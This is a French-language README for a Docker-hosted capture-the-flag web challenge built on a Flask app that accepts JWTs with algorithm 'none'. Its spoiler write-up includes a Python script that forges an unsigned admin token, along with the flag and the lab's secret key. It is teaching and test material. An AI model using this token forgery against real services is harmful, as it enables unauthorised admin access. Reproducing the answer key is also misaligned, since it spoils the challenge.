
# Challenge CTF : Exagon Secure System (JWT None Attack)

## Informations sur le Challenge

* **Catégorie :** Web / Cryptographie
* **Difficulté :** Facile / Intermédiaire
* **Technologie :** Flask (Python), HTTPS, JWT (JSON Web Tokens)
* **Objectif :** Obtenir les droits d'administration pour lire le flag.

---

## Description pour les Joueurs

> "Bienvenue sur le nouveau portail sécurisé d'Exagon Corp. Nos ingénieurs ont implémenté un système d'authentification de pointe basé sur des tokens chiffrés.
>
> On raconte que l'administrateur a accès à des secrets inestimables. Malheureusement, vous n'êtes qu'un invité...
>
> Prouvez-nous que leur sécurité n'est pas si infaillible que ça."

**URL d'accès :** `https://localhost:443` (ou l'IP du serveur)
*Note : Acceptez le certificat SSL auto-signé pour accéder au site.*

---

## Installation & Démarrage

Ce challenge est conteneurisé avec Docker.

### 1. Pré-requis
* Docker
* Docker Compose

### 2. Lancement
Dans le dossier du challenge, lancez la commande suivante :

```bash
sudo docker compose up --build -d
````

Le serveur sera accessible sur le port **443** (mappé souvent sur 8443 ou 443 selon votre `docker-compose.yml`).

### 3\. Arrêt

```bash
sudo docker compose down
```

-----

## Solution (Write-Up)

**⚠️ SPOILER ALERT : Cette section contient la solution du challenge.**

### Analyse de la vulnérabilité

Le serveur utilise des **JWT (JSON Web Tokens)** pour identifier les utilisateurs.
La vulnérabilité réside dans la fonction de vérification du token (`app.py`). Le serveur accepte aveuglément les tokens dont l'entête spécifie l'algorithme `none` (aucune signature), permettant à un attaquant de modifier le contenu du token sans connaitre la clé secrète.

### Étapes de résolution

1.  **Reconnaissance :**

      * Se connecter avec le login par défaut (`guest`).
      * Inspecter les cookies dans le navigateur (F12 \> Stockage).
      * Récupérer le cookie `auth_token`.

2.  **Décodage :**

      * Le token ressemble à `header.payload.signature`.
      * Header décodé : `{"alg": "HS256", ...}`
      * Payload décodé : `{"user": "guest", "role": "user", ...}`

3.  **Exploitation (Forgery) :**

      * Il faut modifier l'algorithme en `none` et le rôle en `admin`.
      * Il faut supprimer la signature mais garder le point final.

### Script de résolution (Python)

Voici un script pour générer le cookie Admin valide :

```python
import base64
import json

# 1. Header malveillant (Algo None)
header = {"alg": "none", "typ": "JWT"}

# 2. Payload malveillant (Role Admin)
payload = {"user": "Hacker", "role": "admin"}

# Fonction d'encodage URL-Safe sans padding
def b64_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip('=')

# 3. Assemblage : Header + Payload + Point final (Sans signature)
forge_token = b64_encode(header) + "." + b64_encode(payload) + "."

print("Cookie Admin à injecter :")
print(forge_token)
```

### Injection

1.  Remplacer la valeur du cookie `auth_token` dans le navigateur par le token généré.
2.  Rafraîchir la page.
3.  Le panneau d'administration s'affiche.

-----

## 🏆 LE FLAG

Une fois connecté en tant qu'admin, le flag s'affiche :

> **CTF{JWT\_N0N3\_4LG0\_1S\_D4NG3R0US}**

-----

## 🛠️ Notes Techniques pour l'Admin

  * **Clé Secrète :** `StefanoLePlusBeau` (Utilisée pour les tokens légitimes, inutile pour l'attaque).
  * **Logs :** Le conteneur affiche un message d'alerte dans les logs (`docker logs -f <id>`) si un token "None" est utilisé avec succès.

<!-- end list -->
